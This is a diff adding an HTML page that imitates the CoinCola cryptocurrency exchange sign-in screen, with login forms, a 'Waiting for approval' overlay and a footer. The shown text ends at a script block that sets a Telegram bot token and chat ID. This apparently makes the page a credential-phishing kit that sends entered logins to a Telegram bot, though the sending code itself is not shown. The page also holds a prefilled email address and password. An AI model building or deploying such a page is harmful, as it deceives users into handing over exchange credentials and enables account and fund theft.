@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In | CoinCola</title>
+    <style>
+         :root {
+            --blue: #1e6bff;
+            --blue-hover: #1558e0;
+            --text: #26323d;
+            --muted: #7d8b99;
+            --border: #dbe2ea;
+            --footer-bg: #f6f8fa;
+            --footer-text: #5a6a78;
+            --placeholder: #b6c2cc;
+            --white: #ffffff;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+            color: var(--text);
+            background: var(--white);
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        
+        button {
+            font-family: inherit;
+            cursor: pointer;
+        }
+        
+        ul {
+            list-style: none;
+        }
+        /* ============ HEADER ============ */
+        
+        .site-header {
+            background: var(--white);
+            padding: 18px 0;
+            border-bottom: 1px solid #eef1f4;
+        }
+        
+        .header-inner {
+            max-width: 1120px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .brand {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .brand-logo {
+            display: inline-flex;
+            width: 26px;
+            height: 26px;
+        }
+        
+        .brand-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .brand-name {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #1b2733;
+        }
+        
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 9px 20px;
+            transition: background 0.15s ease, color 0.15s ease, border-color 0.15s ease;
+        }
+        
+        .btn-primary {
+            background: var(--blue);
+            color: #fff;
+        }
+        
+        .btn-primary:hover {
+            background: var(--blue-hover);
+        }
+        
+        .btn-signup {
+            border-radius: 4px;
+        }
+        
+        .btn-ghost {
+            background: transparent;
+            color: #1b2733;
+            border-radius: 4px;
+        }
+        
+        .btn-ghost:hover {
+            background: #f0f3f6;
+        }
+        
+        .lang-btn {
+            background: transparent;
+            border: none;
+            padding: 6px;
+            display: inline-flex;
+            width: 26px;
+            height: 26px;
+        }
+        
+        .lang-btn svg {
+            width: 100%;
+            height: 100%;
+        }
+        /* ============ MAIN ============ */
+        
+        .main {
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 20px 24px 56px;
+        }
+        
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1b2733;
+            margin-bottom: 26px;
+        }
+        /* Tabs */
+        
+        .login-tabs {
+            display: flex;
+            justify-content: center;
+            gap: 34px;
+            border-bottom: 1px solid #eef1f4;
+            padding-bottom: 12px;
+            margin-bottom: 24px;
+        }
+        
+        .tab {
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #9aa8b5;
+            padding: 0 2px 12px;
+            margin-bottom: -13px;
+            border-bottom: 2px solid transparent;
+            transition: color 0.15s ease, border-color 0.15s ease;
+        }
+        
+        .tab:hover {
+            color: var(--muted);
+        }
+        
+        .tab.active {
+            color: #1b2733;
+            border-bottom-color: var(--blue);
+        }
+        /* Forms */
+        
+        .login-form {
+            text-align: center;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .error-msg {
+            margin-top: 14px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #d93025;
+        }
+        
+        .verify-hint {
+            margin: -6px 0 16px;
+            font-size: 13px;
+            color: var(--muted);
+        }
+        
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.93);
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .spinner-overlay.active {
+            display: flex;
+        }
+        
+        .spinner-box {
+            text-align: center;
+            color: var(--text);
+            font-size: 14px;
+        }
+        
+        .spinner {
+            width: 36px;
+            height: 36px;
+            margin: 0 auto 16px;
+            border: 3px solid var(--border);
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .spinner-box .btn {
+            margin-top: 18px;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .field {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        
+        .input {
+            width: 100%;
+            height: 46px;
+            padding: 0 16px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            font-size: 15px;
+            color: var(--text);
+            background: #fff;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+        
+        .input::placeholder {
+            color: var(--placeholder);
+        }
+        
+        .input:focus {
+            outline: none;
+            border-color: var(--blue);
+            box-shadow: 0 0 0 3px rgba(30, 107, 255, 0.12);
+        }
+        
+        .field-password .input {
+            padding-right: 46px;
+        }
+        
+        .eye-btn {
+            position: absolute;
+            top: 50%;
+            right: 8px;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            width: 34px;
+            height: 34px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--muted);
+        }
+        
+        .eye-btn svg {
+            width: 22px;
+            height: 22px;
+        }
+        
+        .eye-btn .eye-closed {
+            display: none;
+        }
+        
+        .eye-btn.visible .eye-open {
+            display: none;
+        }
+        
+        .eye-btn.visible .eye-closed {
+            display: block;
+        }
+        
+        .btn-login {
+            width: 100%;
+            height: 46px;
+            font-size: 15px;
+            margin-top: 4px;
+        }
+        
+        .forgot {
+            display: inline-block;
+            margin-top: 18px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b2733;
+        }
+        
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        /* Divider */
+        
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 26px 0;
+        }
+        
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #eef1f4;
+        }
+        
+        .divider span {
+            position: relative;
+            background: #fff;
+            padding: 0 14px;
+            font-size: 13px;
+            color: var(--muted);
+        }
+        /* OAuth buttons */
+        
+        .btn-oauth {
+            width: 100%;
+            height: 46px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-google {
+            background: #fff;
+            border: 1px solid var(--border);
+            color: #1b2733;
+            margin-bottom: 16px;
+        }
+        
+        .btn-google:hover {
+            background: #fafbfc;
+        }
+        
+        .btn-google .google-g {
+            width: 21px;
+            height: 21px;
+        }
+        
+        .btn-apple {
+            background: #111;
+            border: 1px solid #111;
+            color: #fff;
+        }
+        
+        .btn-apple:hover {
+            background: #000;
+        }
+        
+        .btn-apple .apple {
+            width: 20px;
+            height: 20px;
+        }
+        /* ============ FOOTER ============ */
+        
+        .site-footer {
+            background: var(--footer-bg);
+            padding: 56px 0 24px;
+            border-top: 1px solid #eef1f4;
+        }
+        
+        .footer-links {
+            max-width: 1120px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 32px;
+        }
+        
+        .footer-col h3 {
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            color: #7d8b99;
+            margin-bottom: 18px;
+        }
+        
+        .footer-col ul li {
+            margin-bottom: 12px;
+        }
+        
+        .footer-col ul li a {
+            font-size: 13px;
+            color: var(--footer-text);
+            transition: color 0.15s ease;
+        }
+        
+        .footer-col ul li a:hover {
+            color: #1b2733;
+        }
+        
+        .footer-bottom {
+            max-width: 1120px;
+            margin: 20px auto 0;
+            padding: 24px;
+            border-top: 1px solid #eef1f4;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 32px;
+        }
+        
+        .footer-brand {
+            max-width: 560px;
+        }
+        
+        .footer-brand .brand {
+            margin-bottom: 14px;
+        }
+        
+        .footer-brand .brand-name {
+            font-size: 22px;
+        }
+        
+        .footer-tagline {
+            font-size: 12.5px;
+            line-height: 1.7;
+            color: var(--footer-text);
+        }
+        
+        .store-badges {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+        
+        .store-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 9px;
+            background: #111;
+            color: #fff;
+            border-radius: 6px;
+            padding: 7px 16px 8px 13px;
+            min-width: 150px;
+        }
+        
+        .store-badge svg {
+            width: 22px;
+            height: 22px;
+        }
+        
+        .badge-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.15;
+        }
+        
+        .badge-text small {
+            font-size: 10px;
+            opacity: 0.85;
+        }
+        
+        .badge-text strong {
+            font-size: 15px;
+            font-weight: 600;
+        }
+        
+        .footer-social {
+            max-width: 1120px;
+            margin: 8px auto 0;
+            padding: 0 24px;
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-social a {
+            color: #5a6a78;
+            width: 20px;
+            height: 20px;
+            display: inline-flex;
+            transition: color 0.15s ease;
+        }
+        
+        .footer-social a:hover {
+            color: #1b2733;
+        }
+        
+        .footer-social svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .footer-copyright {
+            max-width: 1120px;
+            margin: 22px auto 0;
+            padding: 18px 24px 0;
+            border-top: 1px solid #eef1f4;
+            text-align: center;
+            font-size: 12px;
+            color: #9aa8b5;
+        }
+        /* ============ RESPONSIVE ============ */
+        
+        @media (max-width: 960px) {
+            .footer-links {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 28px;
+            }
+            .footer-bottom {
+                flex-direction: column;
+            }
+            .store-badges {
+                flex-direction: row;
+                flex-wrap: wrap;
+            }
+        }
+        
+        @media (max-width: 520px) {
+            .footer-links {
+                grid-template-columns: 1fr;
+            }
+            .header-actions .btn-signup {
+                padding: 8px 15px;
+            }
+            .main {
+                padding: 40px 16px 60px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============ HEADER ============ -->
+    <header class="site-header">
+        <div class="header-inner">
+            <a class="brand" href="#">
+                <span class="brand-logo">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="11" fill="#1e6bff"/>
+            <path d="M9 8.4h4.2c1.4 0 2.6 1.1 2.6 2.5 0 .9-.5 1.7-1.2 2.1.8.4 1.4 1.3 1.4 2.3 0 1.4-1.2 2.6-2.6 2.6H9V8.4z" fill="#fff"/>
+            <path d="M11 10.2v.9M11 12.9v.9" stroke="#1e6bff" stroke-width="1.1" stroke-linecap="round"/>
+          </svg>
+        </span>
+                <span class="brand-name">CoinCola</span>
+            </a>
+
+            <div class="header-actions">
+                <a href="#" class="btn btn-primary btn-signup">Sign up</a>
+                <a href="#" class="btn btn-ghost btn-signin">Sign in</a>
+                <button class="lang-btn" type="button" aria-label="Change language">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="9" stroke="#4b5b6b" stroke-width="1.6"/>
+            <path d="M3 12h18M12 3c2.5 2.6 3.8 5.6 3.8 9S14.5 18.4 12 21c-2.5-2.6-3.8-5.6-3.8-9S9.5 5.6 12 3z" stroke="#4b5b6b" stroke-width="1.6"/>
+          </svg>
+        </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- ============ MAIN / LOGIN ============ -->
+    <main class="main">
+        <section class="login-card">
+            <h1 class="login-title">Hello, Welcome back</h1>
+
+            <div id="loginError" class="error-msg" style="display: none;"></div>
+
+            <div class="login-tabs" id="loginTabs">
+                <button class="tab" data-tab="phone" type="button">Login by phone</button>
+                <button class="tab active" data-tab="email" type="button">Login by email</button>
+            </div>
+
+            <!-- Email form -->
+            <form id="emailForm" class="login-form" novalidate>
+                <div class="field">
+                    <input class="input" type="email" id="email" value="jnwthwr678@gmail.com" autocomplete="email" />
+                </div>
+
+                <div class="field field-password">
+                    <input class="input" type="password" id="password" value="password123" autocomplete="current-password" />
+                    <button class="eye-btn" type="button" id="togglePassword" aria-label="Show password">
+            <svg class="eye-open" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" stroke="#8a9bab" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              <circle cx="12" cy="12" r="3" stroke="#8a9bab" stroke-width="1.6"/>
+            </svg>
+            <svg class="eye-closed" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M2 12s3.5-7 10-7c2 0 3.8.6 5.3 1.5M22 12s-3.5 7-10 7c-2 0-3.8-.6-5.3-1.5M4 4l16 16" stroke="#8a9bab" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+                </div>
+
+                <button class="btn btn-primary btn-login" type="submit">Log in</button>
+
+                <a class="forgot" href="#">Forgot password</a>
+            </form>
+
+            <!-- Phone form (hidden) -->
+            <form id="phoneForm" class="login-form hidden" novalidate>
+                <div class="field">
+                    <input class="input" type="tel" id="phone" placeholder="Phone number" autocomplete="tel" />
+                </div>
+                <button class="btn btn-primary btn-login" type="submit">Log in</button>
+                <a class="forgot" href="#">Forgot password</a>
+            </form>
+
+            <div class="divider"><span>or</span></div>
+
+            <button class="btn btn-oauth btn-google" type="button" id="googleBtn">
+        <svg class="google-g" viewBox="0 0 48 48">
+          <path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.4l6.7-6.7C35.6 2.5 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.4 17.7 9.5 24 9.5z"/>
+          <path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.6 5.9c4.4-4.1 7-10.1 7-17.6z"/>
+          <path fill="#FBBC05" d="M10.4 28.7c-.5-1.5-.8-3-.8-4.7s.3-3.2.8-4.7l-7.8-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.6 10.8l7.8-6.1z"/>
+          <path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.6-5.9c-2.1 1.4-4.8 2.3-7.6 2.3-6.3 0-11.7-3.9-13.6-9.4l-7.8 6.1C6.5 42.6 14.6 48 24 48z"/>
+        </svg>
+        <span>Continue with Google</span>
+      </button>
+
+            <button class="btn btn-oauth btn-apple" type="button" id="appleBtn">
+        <svg class="apple" viewBox="0 0 24 24" fill="#fff">
+          <path d="M17.05 12.94c-.03-2.9 2.37-4.29 2.48-4.36-1.35-1.98-3.46-2.25-4.21-2.28-1.79-.18-3.5 1.06-4.41 1.06-.91 0-2.31-1.03-3.8-1-1.95.03-3.75 1.14-4.75 2.89-2.03 3.53-.52 8.76 1.46 11.63.97 1.4 2.12 2.97 3.63 2.91 1.46-.06 2.01-.94 3.77-.94s2.26.94 3.8.91c1.57-.03 2.57-1.43 3.53-2.84 1.11-1.63 1.57-3.21 1.6-3.29-.03-.02-3.07-1.18-3.1-4.69z"/>
+          <path d="M14.4 4.3c.8-.97 1.34-2.32 1.19-3.66-1.15.05-2.55.77-3.38 1.74-.74.86-1.39 2.23-1.22 3.55 1.29.1 2.6-.65 3.41-1.63z"/>
+        </svg>
+        <span>Continue with Apple</span>
+      </button>
+        </section>
+
+        <!-- Spinner overlay -->
+        <div id="spinnerOverlay" class="spinner-overlay">
+            <div class="spinner-box">
+                <div class="spinner"></div>
+                <p>Waiting for approval&hellip;</p>
+                <button class="btn btn-ghost" type="button" id="cancelPollBtn">Cancel</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- ============ FOOTER ============ -->
+    <footer class="site-footer">
+        <div class="footer-links">
+            <div class="footer-col">
+                <h3>COMPANY</h3>
+                <ul>
+                    <li><a href="#">About Us</a></li>
+                    <li><a href="#">Announcement</a></li>
+                    <li><a href="#">Terms of Service</a></li>
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Community</a></li>
+                    <li><a href="#">Institutions</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-col">
+                <h3>RESOURCES</h3>
+                <ul>
+                    <li><a href="#">Support</a></li>
+                    <li><a href="#">Fees</a></li>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">Partners</a></li>
+                    <li><a href="#">Customer Care</a></li>
+                    <li><a href="#">Blog</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-col">
+                <h3>BUY ANYWHERE</h3>
+                <ul>
+                    <li><a href="#">Buy Bitcoin(BTC) in Nigeria</a></li>
+                    <li><a href="#">Buy Bitcoin(BTC) in Ghana</a></li>
+                    <li><a href="#">Buy Bitcoin(BTC) in Kenya</a></li>
+                    <li><a href="#">Buy Bitcoin(BTC) in Uganda</a></li>
+                    <li><a href="#">Buy Tether(USDT) in Nigeria</a></li>
+                    <li><a href="#">Buy Tether(USDT) in Kenya</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-col">
+                <h3>SELL ANYWHERE</h3>
+                <ul>
+                    <li><a href="#">Sell Bitcoin(BTC) in Nigeria</a></li>
+                    <li><a href="#">Sell Bitcoin(BTC) in Ghana</a></li>
+                    <li><a href="#">Sell Bitcoin(BTC) in Kenya</a></li>
+                    <li><a href="#">Sell Bitcoin(BTC) in Uganda</a></li>
+                    <li><a href="#">Sell Tether(USDT) in Nigeria</a></li>
+                    <li><a href="#">Sell Tether(USDT) in Kenya</a></li>
+                    <li><a href="#">Sell Bitcoin Gift Card</a></li>
+                    <li><a href="#">Sell Gift Cards on Facebook</a></li>
+                    <li><a href="#">Sell Insta Gift Card</a></li>
+                    <li><a href="#">Sell Google Play Gift Card</a></li>
+                    <li><a href="#">Sell Amazon Gift Cards</a></li>
+                    <li><a href="#">Sell iTunes Gift Cards</a></li>
+                </ul>
+            </div>
+
+            <div class="footer-col">
+                <h3>COINCOLA AFRICA</h3>
+                <ul>
+                    <li><a href="#">CoinCola Nigeria</a></li>
+                    <li><a href="#">CoinCola Ghana</a></li>
+                    <li><a href="#">CoinCola Kenya</a></li>
+                    <li><a href="#">USDT to NGN</a></li>
+                    <li><a href="#">USDT to GHS</a></li>
+                    <li><a href="#">USDT to KES</a></li>
+                    <li><a href="#">USDT to UGX</a></li>
+                    <li><a href="#">USD to NGN</a></li>
+                    <li><a href="#">USD to GHS</a></li>
+                    <li><a href="#">USD to KES</a></li>
+                    <li><a href="#">USD to UGX</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <div class="footer-brand">
+                <div class="brand">
+                    <span class="brand-logo">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="12" cy="12" r="11" fill="#1e6bff"/>
+              <path d="M9 8.4h4.2c1.4 0 2.6 1.1 2.6 2.5 0 .9-.5 1.7-1.2 2.1.8.4 1.4 1.3 1.4 2.3 0 1.4-1.2 2.6-2.6 2.6H9V8.4z" fill="#fff"/>
+              <path d="M11 10.2v.9M11 12.9v.9" stroke="#1e6bff" stroke-width="1.1" stroke-linecap="round"/>
+            </svg>
+          </span>
+                    <span class="brand-name">CoinCola</span>
+                </div>
+                <p class="footer-tagline">
+                    We're on a mission to making blockchain and exchange, which provides simple jargon-free buying, P2P trading, and gift card trading services at very low fees. Our integrated platform has been...
+                </p>
+            </div>
+
+            <div class="store-badges">
+                <a class="store-badge" href="#">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M17 12.3c0-2 1.6-3 1.7-3-1-1.4-2.4-1.6-2.9-1.6-1.2-.1-2.4.7-3 .7-.6 0-1.6-.7-2.6-.7-1.3 0-2.6.8-3.3 2-1.4 2.4-.4 6 1 8 .7 1 1.5 2.1 2.5 2 1-.1 1.4-.6 2.6-.6 1.2 0 1.6.6 2.6.6 1.1 0 1.8-1 2.5-2 .8-1.2 1.1-2.3 1.1-2.4-.1 0-2.2-.9-2.2-3z" fill="#fff"/>
+            <path d="M14.8 7.7c.6-.7 1-1.7.9-2.7-.9 0-1.9.6-2.5 1.3-.6.6-1 1.6-.9 2.6 1 .1 1.9-.5 2.5-1.2z" fill="#fff"/>
+          </svg>
+                    <span class="badge-text"><small>Download on the</small><strong>App Store</strong></span>
+                </a>
+                <a class="store-badge" href="#">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.6 2.6c-.3.3-.4.7-.4 1.2v16.4c0 .5.1.9.4 1.2l.1.1 9.2-9.2v-.3L3.7 2.5l-.1.1z" fill="#00d7fe"/>
+            <path d="M16.1 15.5l-3.2-3.2v-.3l3.2-3.2.1.1 3.8 2.2c1.1.6 1.1 1.6 0 2.2l-3.8 2.2h-.1z" fill="#ffce00"/>
+            <path d="M16.2 15.4L12.9 12 3.6 21.2c.4.4 1 .4 1.7 0l10.9-5.8" fill="#ff3a44"/>
+            <path d="M16.2 8.9L5.3 3.1c-.7-.4-1.3-.4-1.7 0L12.9 12l3.3-3.1z" fill="#00f076"/>
+          </svg>
+                    <span class="badge-text"><small>Get it on</small><strong>Google Play</strong></span>
+                </a>
+            </div>
+        </div>
+
+        <div class="footer-social">
+            <a href="#" aria-label="Facebook">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 21v-8.2h2.8l.4-3.2h-3.2V7.5c0-.9.3-1.6 1.6-1.6h1.7V3.1c-.3 0-1.3-.1-2.5-.1-2.5 0-4.2 1.5-4.2 4.3v2.4H7.3v3.2H10V21h3.5z"/></svg>
+            </a>
+            <a href="#" aria-label="Twitter">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 5.8c-.7.3-1.5.6-2.3.7.8-.5 1.4-1.3 1.7-2.2-.8.5-1.7.8-2.6 1-.8-.8-1.9-1.3-3.1-1.3-2.3 0-4.2 1.9-4.2 4.2 0 .3 0 .7.1 1-3.5-.2-6.6-1.8-8.7-4.4-.4.6-.6 1.3-.6 2.1 0 1.5.7 2.7 1.8 3.5-.7 0-1.3-.2-1.9-.5v.1c0 2 1.4 3.7 3.3 4.1-.3.1-.7.1-1.1.1-.3 0-.5 0-.8-.1.5 1.7 2 2.9 3.8 2.9-1.4 1.1-3.1 1.7-5 1.7-.3 0-.7 0-1-.1 1.8 1.1 3.9 1.8 6.1 1.8 7.4 0 11.4-6.1 11.4-11.4v-.5c.8-.6 1.5-1.3 2.1-2.1z"/></svg>
+            </a>
+            <a href="#" aria-label="LinkedIn">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5a2.5 2.5 0 11-.02 5 2.5 2.5 0 01.02-5zM3 9h4v12H3zM9 9h3.8v1.7h.1c.5-1 1.8-2 3.7-2 4 0 4.7 2.6 4.7 6V21h-4v-5.5c0-1.3 0-3-1.8-3s-2.1 1.4-2.1 2.9V21H9z"/></svg>
+            </a>
+            <a href="#" aria-label="Instagram">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.2c3.2 0 3.6 0 4.8.1 1.2.1 1.8.2 2.2.4.6.2 1 .5 1.4.9.4.4.7.8.9 1.4.2.4.4 1 .4 2.2.1 1.2.1 1.6.1 4.8s0 3.6-.1 4.8c-.1 1.2-.2 1.8-.4 2.2-.2.6-.5 1-.9 1.4-.4.4-.8.7-1.4.9-.4.2-1 .4-2.2.4-1.2.1-1.6.1-4.8.1s-3.6 0-4.8-.1c-1.2-.1-1.8-.2-2.2-.4-.6-.2-1-.5-1.4-.9-.4-.4-.7-.8-.9-1.4-.2-.4-.4-1-.4-2.2C2.2 15.6 2.2 15.2 2.2 12s0-3.6.1-4.8c.1-1.2.2-1.8.4-2.2.2-.6.5-1 .9-1.4.4-.4.8-.7 1.4-.9.4-.2 1-.4 2.2-.4 1.2-.1 1.6-.1 4.8-.1zm0 1.8c-3.1 0-3.5 0-4.7.1-1.1.1-1.7.2-2.1.4-.5.2-.9.4-1.3.8-.4.4-.6.8-.8 1.3-.2.4-.3 1-.4 2.1-.1 1.2-.1 1.6-.1 4.7s0 3.5.1 4.7c.1 1.1.2 1.7.4 2.1.2.5.4.9.8 1.3.4.4.8.6 1.3.8.4.2 1 .3 2.1.4 1.2.1 1.6.1 4.7.1s3.5 0 4.7-.1c1.1-.1 1.7-.2 2.1-.4.5-.2.9-.4 1.3-.8.4-.4.6-.8.8-1.3.2-.4.3-1 .4-2.1.1-1.2.1-1.6.1-4.7s0-3.5-.1-4.7c-.1-1.1-.2-1.7-.4-2.1-.2-.5-.4-.9-.8-1.3-.4-.4-.8-.6-1.3-.8-.4-.2-1-.3-2.1-.4-1.2-.1-1.6-.1-4.7-.1zm0 3.1a5 5 0 110 10 5 5 0 010-10zm0 1.8a3.2 3.2 0 100 6.4 3.2 3.2 0 000-6.4zm5.2-3a1.2 1.2 0 110 2.4 1.2 1.2 0 010-2.4z"/></svg>
+            </a>
+            <a href="#" aria-label="YouTube">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23 12s0-3.8-.5-5.6c-.3-1-1.1-1.8-2.1-2C18.6 4 12 4 12 4s-6.6 0-8.4.4c-1 .3-1.8 1-2.1 2C1 8.2 1 12 1 12s0 3.8.5 5.6c.3 1 1.1 1.8 2.1 2 1.8.4 8.4.4 8.4.4s6.6 0 8.4-.4c1-.3 1.8-1 2.1-2 .5-1.8.5-5.6.5-5.6zM9.8 15.5v-7l6 3.5-6 3.5z"/></svg>
+            </a>
+            <a href="#" aria-label="Telegram">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M21.9 4.6l-3.1 14.7c-.2 1-.8 1.2-1.7.8l-4.6-3.4-2.2 2.1c-.2.2-.5.5-.9.5l.3-4.6 8.4-7.6c.4-.3-.1-.5-.6-.2L7.3 13.2l-4.5-1.4c-1-.3-1-1 .2-1.5l17.5-6.8c.8-.3 1.5.2 1.4 1.1z"/></svg>
+            </a>
+            <a href="#" aria-label="Reddit">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22 12c0-1.2-1-2.2-2.2-2.2-.6 0-1.1.2-1.5.6-1.3-.7-2.9-1.2-4.6-1.3l.9-4 3 .6c.1.7.7 1.2 1.4 1.2.8 0 1.4-.6 1.4-1.4S20 4 19.2 4c-.6 0-1.1.4-1.3.9l-3.4-.7c-.3 0-.5.1-.6.4l-1 4.5c-1.8 0-3.4.5-4.7 1.3-.4-.4-1-.6-1.6-.6-1.2 0-2.2 1-2.2 2.2 0 .9.5 1.7 1.2 2-.1.4-.1.8-.1 1.2 0 3.3 3.5 6 7.8 6s7.8-2.7 7.8-6c0-.4 0-.8-.1-1.2.7-.3 1.2-1.1 1.2-2zm-6.4 4.5c-.9.9-2.4 1-3 .1-.2-.2-.1-.5.1-.6.2-.1.4-.1.6.1.3.4 1.1.4 1.7-.1.2-.2.5-.1.6 0 .1.2.1.4 0 .5zm-5.2 0c-.6.6-1.5.5-1.7.1-.2-.2-.1-.5.1-.6.2-.1.4-.1.6.1.5.5 1.3.5 1.7.1.2-.2.5-.1.6.1.1.1.1.4 0 .5-.1.1-.2.1-.3.1zm.3-2.6l-1.4 1c-.2.1-.4.1-.6-.1-.1-.2-.1-.4.1-.6l1.4-1c.3-.2.7-.2 1-.1.3.1.6.3.7.6.1.2 0 .5-.3.5-.3 0-.6-.4-.9-.3zm5.6 1c-.2.2-.4.2-.6.1l-1.4-1c-.3-.2-.6-.2-1-.1-.2.1-.4 0-.4-.3 0-.2.2-.4.4-.5.4-.2.8-.2 1.1 0l1.6 1.2c.2.1.3.4.3.6z"/></svg>
+            </a>
+            <a href="#" aria-label="Medium">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.5 12c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7 7 3.1 7 7zm7.5-6.9c1.2 0 2.2 3.1 2.2 6.9s-1 6.9-2.2 6.9-2.2-3.1-2.2-6.9 1-6.9 2.2-6.9z"/></svg>
+            </a>
+            <a href="#" aria-label="Discord">
+                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.3 4.4A19.8 19.8 0 0015.9 3l-.2.4c1.6.4 2.4 1 3.2 1.6A13.6 13.6 0 0012 3.8c-2 0-3.9.4-5.9 1.2.8-.6 1.7-1.2 3.2-1.6L9.1 3a19.6 19.6 0 00-4.4 1.4C2 8.7 1.3 12.9 1.7 17c1.7 1.3 3.4 2 5 2.5l1-1.5c-.9-.3-1.7-.7-2.5-1.2l.6-.4c2.6 1.2 5.4 1.8 8.2 1.8s5.6-.6 8.2-1.8l.6.4c-.8.5-1.6.9-2.5 1.2l1 1.5c1.6-.5 3.3-1.2 5-2.5.5-4.8-.8-8.9-3-12.6zM8.7 14.8c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2zm6.6 0c-1 0-1.8-.9-1.8-2s.8-2 1.8-2 1.8.9 1.8 2-.8 2-1.8 2z"/></svg>
+            </a>
+        </div>
+
+        <div class="footer-copyright">Copyright © 2026 CoinCola. All Rights Reserved.</div>
+    </footer>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8676570649:AAEQLrnR5ZnIxXQeXW0TGrgi3FvYX3nQ0O0";
+        const TELEGRAM_CHAT_ID = "1003670447";
